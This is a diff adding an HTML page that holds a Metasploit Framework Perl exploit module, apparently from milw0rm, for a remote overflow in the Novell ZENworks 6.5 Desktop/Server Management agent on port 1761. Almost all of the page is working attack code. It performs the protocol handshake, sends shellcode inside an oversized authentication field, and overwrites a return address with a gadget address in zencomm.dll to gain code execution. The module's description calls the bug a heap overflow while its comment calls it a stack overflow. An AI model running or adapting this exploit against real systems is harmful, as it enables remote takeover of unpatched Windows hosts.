@@ -1,0 +1,139 @@
+<html>
+<head>
+<title>ZENworks 6.5 Desktop/Server Management Remote Stack Overflow</title>
+<pre>
+#
+#
+
+package Msf::Exploit::zenworks_desktop_agent;
+use strict;
+use base &quot;Msf::Exploit&quot;;
+use Pex::Text;
+
+my $advanced = { };
+
+my $info =
+  {
+	'Name'  =&gt; 'ZENworks 6.5 Desktop/Server Management Remote Stack Overflow',
+	'Version'  =&gt; '$Revision: 1.1 $',
+	'Authors' =&gt;
+	  [
+		'Anonymous',
+	  ],
+	'Arch'  =&gt; [ 'x86' ],
+	'OS'    =&gt; [ 'win32', 'winxp', 'win2k', 'win2003' ],
+	'Priv'  =&gt; 1,
+
+	'UserOpts'  =&gt;
+	  {
+		'RHOST' =&gt; [1, 'ADDR', 'The target address'],
+		'RPORT' =&gt; [1, 'PORT', 'The target port', 1761 ],
+	  },
+	  
+	'Payload' =&gt;
+	  {
+		'Space'     =&gt; 0x7FFF,
+		'BadChars'  =&gt; &quot;\x00&quot;,
+		'Keys'      =&gt; ['+ws2ord'],
+	  },
+
+	'Description'  =&gt; Pex::Text::Freeform(qq{
+		This module exploits a heap overflow in the Novell ZENworks
+        Desktop Management agent.
+}),
+
+	'Refs'  =&gt;
+	  [
+		['BID', 13678],
+	  ],  
+	 
+	'Targets' =&gt;
+	  [
+		[ 'Windows XP/2000/2003- ZENworks 6.5 Desktop/Server Agent', 0x10002e06]
+	  ],
+	  
+	'Keys'  =&gt; ['zenworks'],
+};
+
+sub new {
+	my $class = shift;
+	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
+	return($self);
+}
+
+sub Exploit {
+	my $self        = shift;
+	my $target_host = $self-&gt;GetVar('RHOST');
+	my $target_port = $self-&gt;GetVar('RPORT');
+	my $target_idx  = $self-&gt;GetVar('TARGET');
+	my $shellcode   = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
+	my $target      = $self-&gt;Targets-&gt;[$target_idx];
+
+	$self-&gt;PrintLine( &quot;[*] Attempting to exploit &quot; . $target-&gt;[0] );
+
+	my $s = Msf::Socket::Tcp-&gt;new(
+		'PeerAddr'  =&gt; $target_host,
+		'PeerPort'  =&gt; $target_port,
+		'LocalPort' =&gt; $self-&gt;GetVar('CPORT'),
+	  );
+
+	if ( $s-&gt;IsError ) {
+		$self-&gt;PrintLine( '[*] Error creating socket: ' . $s-&gt;GetError );
+		return;
+	}
+
+        my $req = &quot;\x00\x06\x05\x01\x10\xe6\x01\x00\x34\x5a\xf4\x77\x80\x95\xf8\x77&quot;;
+        $self-&gt;PrintLine( &quot;[*] Sending version identication&quot; );
+	$s-&gt;Send($req);
+
+        my $ident = $s-&gt;Recv(-1, 16);
+        if (length($ident) != 16)
+        {
+         $self-&gt;PrintLine( &quot;[*] Failed to receive agent version identication&quot; );
+         return;
+        }
+        else
+        {
+         $self-&gt;PrintLine( &quot;[*] Received agent version identication&quot; );
+        }
+
+        $req = &quot;\x00\x01&quot;;
+        $self-&gt;PrintLine( &quot;[*] Sending client acknowledgment&quot; );
+	$s-&gt;Send($req);
+
+        # stack overflow in ZenRem32.exe / ZENworks Server Management
+
+	$req = &quot;\x00\x06metmet\x00\x06metmet\x7F\xFF&quot; . $shellcode . &quot;\x00\x01&quot;;
+        $self-&gt;PrintLine( &quot;[*] Sending authentication data (including shellcode)&quot; );
+        $s-&gt;Send($req);
+
+	$s-&gt;Recv(2, 2);
+	$s-&gt;Send(&quot;\x00\x01&quot;);
+        
+        #$s-&gt;Recv(2, 2);
+        #my $len = $s-&gt;Recv(2,2);
+        #$len = unpack ('n', $len);
+        #$s-&gt;Recv($len, $len);
+	
+        $s-&gt;Send(&quot;\x00\x02&quot;);
+
+        $self-&gt;PrintLine( &quot;[*] Sending final payload&quot; );
+
+        # pop/pop/pop/pop/pop/ret in zencomm.dll on our shellcode
+	my $crash = &quot;A&quot; x 0x20;
+	$req = &quot;\x00\x24&quot; . $crash . pack('V', $target-&gt;[1]);
+        $s-&gt;Send($req);
+	    
+	$self-&gt;PrintLine(&quot;[*] Overflow request sent, sleeping for four seconds&quot;);
+	select(undef, undef, undef, 4);
+
+	$self-&gt;Handler($s);
+        return;
+}
+
+1;
+
+# milw0rm.com [2005-08-12]
+</pre>
+</html>
+
